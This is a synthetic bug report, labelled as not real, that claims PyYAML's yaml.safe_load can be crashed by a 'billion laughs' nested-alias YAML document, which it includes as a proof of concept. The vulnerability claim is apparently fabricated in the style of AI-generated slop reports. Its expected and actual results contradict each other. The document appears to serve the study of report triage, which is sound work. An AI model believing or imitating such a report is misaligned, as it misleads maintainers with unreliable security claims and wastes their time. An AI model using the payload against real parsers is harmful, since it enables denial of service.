Title: Denial of service via memory exhaustion (billion laughs) in yaml.safe_load
Reporter: replay, synthetic
Source: synthetic, modelled on the patterns in curl's publicly disclosed AI slop reports (https://gist.github.com/bagder/07f7581f6e3d78ef37dfbfc81fd1d1cd). Not a real report.
Severity: high
Affected version: 5.3.1
Entry point: yaml.safe_load
Claimed impact: denial of service, memory exhaustion of the host process

## Description

PyYAML does not limit alias expansion. A small document with nested
anchors expands exponentially when parsed by `yaml.safe_load`, consuming
all available memory and crashing the server. This is the classic "billion
laughs" attack and leads to a complete denial of service.

## Proof of concept

```yaml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
j: &j [*i,*i,*i,*i,*i,*i,*i,*i,*i]
```

## Expected result

The process consumes gigabytes of memory and is killed.

Expected: safe_load returns the nested lists quickly
Actual: the process runs out of memory
